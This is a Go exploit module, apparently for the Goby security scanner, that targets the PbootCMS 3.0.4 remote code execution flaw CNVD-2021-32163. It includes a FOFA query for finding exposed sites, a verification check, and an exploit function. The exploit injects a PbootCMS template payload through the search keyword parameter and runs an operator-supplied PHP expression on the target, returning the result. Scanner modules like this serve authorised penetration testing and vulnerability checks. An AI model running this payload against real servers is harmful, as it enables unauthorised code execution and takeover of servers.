package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PbootCMS 3.0.4 RCE (CNVD-2021-32163)",
    "Description": "<p>PbootCMS is an open source and free PHP enterprise website development and construction management system.</p><p>There is a command execution vulnerability in the ParserController.php file of the PbootCMS management system. Attackers can use this vulnerability to execute arbitrary PHP code and gain server permissions.</p>",
    "Impact": "PbootCMS 3.0.4 RCE (CNVD-2021-32163)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.pbootcms.com/changelog\">https://www.pbootcms.com/changelog</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "PbootCMS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "PbootCMS管理系统 3.0.4 版本代码执行漏洞（CNVD-2021-32163）",
            "Description": "<p>PbootCMS是一款开源免费的PHP企业网站开发建设管理系统。</p><p>PbootCMS管理系统3.0.4版本 ParserController.php文件存在命令执行漏洞，攻击者可利用该漏洞执行任意PHP代码，获得服务器权限。</p>",
            "Impact": "<p>PbootCMS管理系统ParserController.php文件存在命令执行漏洞，攻击者可利用该漏洞执行任意PHP代码，获得服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.pbootcms.com/changelog\">https://www.pbootcms.com/changelog</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "PbootCMS",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PbootCMS 3.0.4 RCE (CNVD-2021-32163)",
            "Description": "<p>PbootCMS is an open source and free PHP enterprise website development and construction management system.</p><p>There is a command execution vulnerability in the ParserController.php file of the PbootCMS management system. Attackers can use this vulnerability to execute arbitrary PHP code and gain server permissions.</p>",
            "Impact": "PbootCMS 3.0.4 RCE (CNVD-2021-32163)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.pbootcms.com/changelog\">https://www.pbootcms.com/changelog</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "PbootCMS",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(header=\"Set-Cookie: pbootsystem=\")",
    "GobyQuery": "(header=\"Set-Cookie: pbootsystem=\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.pbootcms.com/",
    "DisclosureDate": "2021-09-25",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-32163"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-32163"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "if(([php.info][0])([1][0]));//)",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "PbootCMS"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10229"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/search/?keyword={pboot{user:password}:if(([php.info][0])([1][0]));//)}xxx{/pboot:if}"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "This program makes use of the Zend Scripting Language Engine:") && strings.Contains(resp1.RawBody, "PHP Version")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/search/?keyword={pboot{user:password}:" + cmd + "}xxx{/pboot:if}"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					if regexp.MustCompile("(?s)PHP Version(.*?)www.zend.com").MatchString(resp.RawBody) {
						body := regexp.MustCompile("(?s)PHP Version(.*?)www.zend.com").FindStringSubmatch(resp.RawBody)
						expResult.Output = body[1]
					} else {
						expResult.Output = resp.RawBody
					}
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
